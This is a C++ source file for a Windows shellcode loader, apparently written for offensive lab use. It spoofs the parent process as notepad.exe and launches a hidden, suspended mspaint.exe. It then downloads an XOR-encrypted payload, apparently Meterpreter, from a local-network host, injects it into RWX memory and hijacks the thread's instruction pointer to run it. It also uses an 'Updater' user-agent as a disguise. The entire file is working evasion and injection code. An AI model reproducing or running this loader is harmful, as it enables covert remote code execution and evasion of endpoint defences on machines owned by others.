#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include<wininet.h>
#pragma comment(lib, "wininet.lib")

//decrypt the shellcode
void xor_encrypt_decrypt(uint8_t* data, size_t data_len, const char* key) {
	size_t key_len = strlen(key);
	for (size_t i = 0; i < data_len; i++) {
		data[i] ^= key[i % key_len];
	}
}
DWORD FindProcessId(const std::wstring& processName) {
	PROCESSENTRY32W processInfo = { 0 };
	processInfo.dwSize = sizeof(processInfo);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) return 0;
	Process32FirstW(snapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile)) {
		CloseHandle(snapshot);
		return processInfo.th32ProcessID;
	}
	while (Process32NextW(snapshot, &processInfo)) {
		if (!processName.compare(processInfo.szExeFile)) {
			CloseHandle(snapshot);
			return processInfo.th32ProcessID;
		}
	}
	CloseHandle(snapshot);
	return 0;
}

int main() {

	// Step 1: Find a legitimate process to spoof, e.g. explorer.exe
	//using notepad ( notepad must be running )
	DWORD parentPid = FindProcessId(L"notepad.exe");
	if (!parentPid) {
		std::cerr << "[-] Could not find notepad.exe\n";
		return -1;
	}
	// Step 2: Open the process handle
	HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
	if (!hParent) {
		std::cerr << "[-] Failed to open parent process\n";
		return -1;
	}

	// Step 3: Set up attribute list for spoofing PPID
	STARTUPINFOEXA si = { sizeof(si)};
	PROCESS_INFORMATION pi = { 0 };
	SIZE_T attrSize = 0;
	//si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(), 0, attrSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
	UpdateProcThreadAttribute(
		si.lpAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&hParent,
		sizeof(HANDLE),
		NULL,
		NULL
	);
	Sleep(3000);
	//hide process window
	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = SW_HIDE;

	// Step 4: Create the new process with spoofed parent
	char cmdLine[] = "C:\\Windows\\System32\\mspaint.exe";
	if (!CreateProcessA(
		NULL,
		cmdLine,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si.StartupInfo,
		&pi))

	{
		std::cerr << "[-] Failed to create process: " << GetLastError() << "\n";
		return -1;
	}
	std::cout << "[+] Process created with spoofed parent and pid is : " << pi.dwProcessId << std::endl;
	DeleteProcThreadAttributeList(si.lpAttributeList);
	HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
	//---------------------------------------

	//Open internet session and get the file handle
	HINTERNET hInternet = InternetOpen(L"Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hFile = InternetOpenUrl(hInternet, L"http://192.168.56.111:8000/encrypted_meter.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);

	DWORD bytesRead;
	BYTE buffer[203850];

	//get the shellcode in buffer
	InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead);


	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pi.dwThreadId);
	if (!hThread) {
		printf("Error open thread.\n");
		return 1;
	}

	// Allocate Shellcode in Memory

	LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, sizeof(buffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("Memory allocated at: %p\n", remoteShellcode);

	//decrypt the shellcode
	const char key[] = "secret";
	xor_encrypt_decrypt(buffer, sizeof(buffer), key);
	Sleep(4000);
	printf("Now going to write shellcode into this memory\n");

	//copy the shellcode into target process
	WriteProcessMemory(pi.hProcess, remoteShellcode, buffer, sizeof(buffer), NULL);
	Sleep(4000);
	printf("shellcode is written!\n");

	printf("Getting context ( registers state ) of thread\n");

	// Get Context Thread
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);   //Retrieves the thread registers (RIP/EIP, RSP, RAX, etc.). 
	//This snapshot is the CPU state at the exact moment you paused the thread.

	//Redirect execution to shellcode
#ifdef _WIN64
	// Redirect the RIP (64 bits) for shellcode, Here, we overwrite RIP with the address where our shellcode lives in the target process.
	ctx.Rip = (DWORD64)remoteShellcode;
#else
	// Redirect the EIP (32 bits) for shellcode
	ctx.Eip = (DWORD)remoteShellcode;
#endif

	printf("thread RIP is going to be changed to our shellcode memory address!\n");
	//update the thread context ( registers)
	SetThreadContext(hThread, &ctx);

	printf("Resuming thread\n");
	Sleep(12000);
	// Resume the thread
	ResumeThread(hThread);

	// Clear
	CloseHandle(hThread);
	CloseHandle(pi.hProcess);

	//---------------------------------------

	CloseHandle(hParent);


	return 0;

}
